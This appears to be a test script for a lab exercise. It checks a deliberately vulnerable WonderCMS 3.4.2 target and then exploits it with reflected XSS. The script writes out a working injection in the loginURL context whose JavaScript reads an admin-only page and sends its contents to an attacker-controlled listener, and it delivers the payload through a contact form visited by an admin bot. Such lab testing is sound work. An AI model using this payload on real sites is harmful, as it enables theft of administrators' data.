#!/usr/bin/env python3
"""Ordinary learner black-box test: submit a URL, let the target bot visit it,
and receive the admin-only Flag at an attacker-controlled listener.
The attacker container is never given the admin password or target Flag.
"""
from __future__ import annotations

import os
import threading
import time
import urllib.parse
import urllib.request
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

TARGET = "http://wondercms-target:8080"
CALLBACK_HOST = "wondercms-attacker"
CALLBACK_PORT = 8081
EXPECTED = os.environ["EXPECTED_FLAG"]
received: list[str] = []


class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed = urllib.parse.urlsplit(self.path)
        if parsed.path == "/collect":
            values = urllib.parse.parse_qs(parsed.query).get("flag", [])
            if values:
                received.append(values[0])
            self.send_response(204)
            self.end_headers()
            return
        self.send_response(404)
        self.end_headers()

    def log_message(self, fmt, *args):
        pass


server = ThreadingHTTPServer(("0.0.0.0", CALLBACK_PORT), Handler)
thread = threading.Thread(target=server.serve_forever, daemon=True)
thread.start()

with urllib.request.urlopen(TARGET + "/", timeout=8) as response:
    assert b"Northbound Press" in response.read()
with urllib.request.urlopen(TARGET + "/contact.php", timeout=8) as response:
    assert b"Website" in response.read()

for path in ("/review-proof.php", "/data/database.js"):
    try:
        urllib.request.urlopen(TARGET + path, timeout=5)
    except urllib.error.HTTPError as err:
        assert err.code in (403, 404), (path, err.code)
    else:
        raise AssertionError("Anonymous visitor accessed protected resource: " + path)
print("PASS: ordinary visitor can browse and submit; admin-only Flag and CMS database remain private", flush=True)

# The XSS vector is the original WonderCMS 3.4.2 loginURL form-action context.
# The attacker supplies a URL in the contact form. The target-local bot extracts
# only its path, logs in with its private admin account, and visits that path.
callback = "http://" + CALLBACK_HOST + ":" + str(CALLBACK_PORT) + "/collect?flag="
javascript = (
    "fetch('/review-proof.php',{credentials:'include'})"
    ".then(r=>r.text())"
    ".then(v=>{(new Image()).src='" + callback + "'+encodeURIComponent(v)})"
)
injection = 'loginURL?"></form><script>' + javascript + '</script><form action="'
crafted_path = "/index.php?page=" + urllib.parse.quote(injection, safe="?")
crafted_url = TARGET + crafted_path

form = urllib.parse.urlencode({
    "name": "Editorial Review",
    "email": "learner@example.test",
    "age": "30",
    "country": "test",
    "website": crafted_url,
}).encode()
request = urllib.request.Request(TARGET + "/contact.php", data=form, method="POST")
with urllib.request.urlopen(request, timeout=8) as response:
    page = response.read().decode("utf-8", "replace")
    assert "submitted" in page.lower(), page[:300]
print("PASS: crafted reflected-XSS URL accepted through the ordinary contact form", flush=True)

deadline = time.time() + 70
while time.time() < deadline and not received:
    time.sleep(0.5)
server.shutdown()
assert received, "the target-local admin review bot did not exfiltrate a result"
assert received[0].strip() == EXPECTED, "admin browser returned an unexpected value: " + repr(received[0])
print("PASS: in-container admin bot visited the submitted URL; real XSS read admin-only Flag and exfiltrated it", flush=True)
